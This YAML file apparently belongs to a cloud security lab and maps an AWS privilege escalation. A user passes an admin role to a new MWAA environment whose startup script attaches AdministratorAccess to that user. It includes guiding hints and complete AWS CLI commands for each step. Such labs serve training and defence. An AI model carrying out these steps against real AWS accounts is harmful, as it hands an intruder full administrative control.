attackMap:
  nodes:
    - id: starting-user
      label: "Starting User"
      type: principal
      subType: iam-user
      arn: "arn:aws:iam::{account_id}:user/pl-prod-mwaa-001-to-admin-starting-user"
      access:
        type: assumed-breach-credentials
      description: >
        You have gained access to this principal's AWS IAM credentials. These could
        have been obtained through many real-world vectors: phishing a developer and
        gaining access to their workstation, compromising a browser session, exploiting
        a vulnerable workload running in this AWS account, discovering credentials in
        a public S3 bucket, or finding them hardcoded in source code or a CI/CD pipeline.

        Regardless of how you obtained them, you are now operating as this principal.
        This IAM user has iam:PassRole permission on the admin execution role and
        airflow:CreateEnvironment permission, enabling you to create an MWAA environment
        with an administrative execution role and a malicious startup script.

    - id: mwaa-environment
      label: "MWAA Environment"
      type: resource
      subType: mwaa-environment
      arn: "arn:aws:airflow:{region}:{account_id}:environment/pl-prod-mwaa-001-env"
      description: >
        An Amazon Managed Workflows for Apache Airflow (MWAA) environment created by
        the attacker. The environment is configured with the admin execution role and
        a malicious startup script hosted in an attacker-controlled S3 bucket. When
        the environment initializes (20-30 minutes), the startup script executes with
        the full permissions of the execution role.

    - id: admin-role
      label: "Admin Execution Role"
      type: principal
      subType: iam-role
      isTarget: true
      arn: "arn:aws:iam::{account_id}:role/pl-prod-mwaa-001-to-admin-admin-role"
      description: >
        The administrative IAM role passed to the MWAA environment as its execution
        role. The startup script executes with this role's credentials and attaches
        AdministratorAccess to the starting user, granting full administrative access
        to the AWS account.

  edges:
    - from: starting-user
      to: mwaa-environment
      label: "iam:PassRole + airflow:CreateEnvironment"
      description: >
        The attacker creates an MWAA environment, passing the admin execution role via
        iam:PassRole and specifying a malicious startup script hosted in an
        attacker-controlled S3 bucket.
      hints:
        - "Start by understanding what IAM roles exist and which ones you can pass. Use iam:GetRole to inspect a role's trust policy and see what services it trusts."
        - "You have airflow:CreateEnvironment -- look at what parameters this API call accepts. Pay special attention to ExecutionRoleArn and StartupScriptS3Path."
        - "MWAA environments can reference S3 buckets for DAGs and startup scripts. You need a bucket with a dags/ folder and a startup script. Check the Terraform output for a pre-staged attacker bucket."
        - "The startup script runs before Airflow initializes and executes with the full permissions of the execution role. Think about what AWS CLI commands that role can run."
        - "You need several EC2 networking permissions alongside airflow:CreateEnvironment -- MWAA validates that the caller has permissions it will need for VPC setup. Check the Terraform output for VPC, subnet, and security group IDs."
        - "Browse to https://pathfinding.cloud/paths/mwaa-001 for technique details."
      commands:
        - description: "Check which role is available for passing and confirm its trust policy allows airflow.amazonaws.com"
          command: "aws iam get-role --role-name pl-prod-mwaa-001-to-admin-admin-role --query 'Role.{Arn:Arn,TrustPolicy:AssumeRolePolicyDocument}' --output json"
        - description: "Create the MWAA environment with the admin execution role and malicious startup script"
          command: |
            aws mwaa create-environment \
              --region "$AWS_REGION" \
              --name "pl-mwaa-001-demo-$(cat /dev/urandom | tr -dc 'a-z0-9' | fold -w 6 | head -n 1)" \
              --execution-role-arn "arn:aws:iam::{account_id}:role/pl-prod-mwaa-001-to-admin-admin-role" \
              --source-bucket-arn "arn:aws:s3:::pl-mwaa-001-attacker-bucket-{account_id}-{suffix}" \
              --dag-s3-path "dags" \
              --startup-script-s3-path "startup.sh" \
              --network-configuration "SubnetIds=subnet-xxx,subnet-yyy,SecurityGroupIds=sg-xxx" \
              --environment-class "mw1.small" \
              --airflow-version "2.8.1" \
              --webserver-access-mode "PUBLIC_ONLY" \
              --max-workers 2 \
              --min-workers 1

    - from: mwaa-environment
      to: admin-role
      label: "Startup script execution"
      description: >
        When the MWAA environment initializes, the startup script runs with the
        execution role's credentials and attaches AdministratorAccess to the starting
        user, completing the privilege escalation.
      hints:
        - "MWAA environment creation is asynchronous -- use airflow:GetEnvironment to poll the status. You are waiting for the AVAILABLE state, which takes 20-30 minutes."
        - "Once the environment reaches AVAILABLE status, the startup script has already run. Check whether AdministratorAccess is now attached to your starting user using iam:ListAttachedUserPolicies."
        - "If the policy is attached, verify the escalation by attempting an action that requires admin privileges -- for example, listing IAM users with iam:ListUsers."
      commands:
        - description: "Poll until the environment reaches AVAILABLE status (checks every 60 seconds)"
          command: |
            while true; do
              STATUS=$(aws mwaa get-environment \
                --region "$AWS_REGION" \
                --name "$ENVIRONMENT_NAME" \
                --query 'Environment.Status' \
                --output text)
              echo "Status: $STATUS"
              [ "$STATUS" = "AVAILABLE" ] && break
              sleep 60
            done
        - description: "Verify AdministratorAccess is attached to the starting user"
          command: "aws iam list-attached-user-policies --user-name pl-prod-mwaa-001-to-admin-starting-user --query 'AttachedPolicies[*].PolicyArn' --output text"
        - description: "Confirm admin access by listing IAM users"
          command: "aws iam list-users --max-items 3 --output table"
